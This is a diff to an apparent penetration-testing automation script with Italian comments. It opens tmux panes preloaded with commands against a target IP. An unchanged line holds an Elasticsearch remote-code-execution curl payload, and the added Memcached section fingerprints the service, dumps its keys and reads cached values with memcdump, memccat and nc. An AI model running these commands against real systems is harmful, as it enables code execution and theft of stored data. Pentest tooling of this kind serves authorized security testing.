@@ -2948,6 +2948,40 @@ tmux send-keys -t PT:36.7 "# Elasticsearch: RCE execute id" Enter
 tmux send-keys -t PT:36.7 "curl -X POST \"http://$ip:9200/_search\" -H \"Content-Type: application/json\" -d '{\"script_fields\":{\"rce\":{\"script\":{\"lang\":\"painless\",\"source\":\"java.lang.Runtime.getRuntime().exec(\"id\").text\"}}}}'"
 cd $folderProject
 
+cd $folderProjectAuthN
+# Memchached
+tmux new-window -t PT:37 -n '[11211] Memcached'
+tmux split-window -v -t PT:37.0
+tmux split-window -v -t PT:37.1
+tmux select-pane -t "37.1"
+tmux split-window -h -t "37.1"
+tmux split-window -h -t "37.1"
+tmux split-window -v -t PT:37.4
+tmux select-pane -t "37.4"
+tmux split-window -h -t "37.4"
+tmux split-window -h -t "37.4"
+tmux split-window -h -t "37.4"
+tmux split-window -h -t "37.4"
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:37.0 "# Memchached: Service fingerprint" Enter
+tmux send-keys -t PT:37.0 "nmap -p11211 --script=memcached-info $ip"
+tmux send-keys -t PT:37.1 "# Memchached: Information Gathering Auto - statistics" Enter
+tmux send-keys -t PT:37.1 "memcstat --servers=$ip"
+tmux send-keys -t PT:37.2 "# Memchached: Information Gathering Auto - get all keys" Enter
+tmux send-keys -t PT:37.2 "memcdump --servers=$ip"
+tmux send-keys -t PT:37.3 "# Memchached: Information Gathering Auto - get values of specific keys" Enter
+tmux send-keys -t PT:37.3 "memccat --servers=$ip KEY1 KEY2 KEY3"
+tmux send-keys -t PT:37.4 "# Memchached: Information Gathering Manual - get Version" Enter
+tmux send-keys -t PT:37.4 "echo "version" | nc -vn $ip 11211"
+tmux send-keys -t PT:37.5 "# Memchached: Information Gathering Manual - get keys number of all the slubs" Enter
+tmux send-keys -t PT:37.5 "echo "stats items" | nc -vn $ip 11211"
+tmux send-keys -t PT:37.6 "# Memchached: Information Gathering Manual - get keys of a specific slub" Enter
+tmux send-keys -t PT:37.6 "echo "stats cachedump 1 0" | nc -vn $ip 11211"
+tmux send-keys -t PT:37.7 "# Memchached: Information Gathering Manual - get value of a specific key (e.g. usres" Enter
+tmux send-keys -t PT:37.7 "echo "get user" | nc -vn $ip 11211 "
+cd $folderProject
+
+
 # Attivazione della modalità interattiva
 tmux -2 attach-session -t PT
 ;;
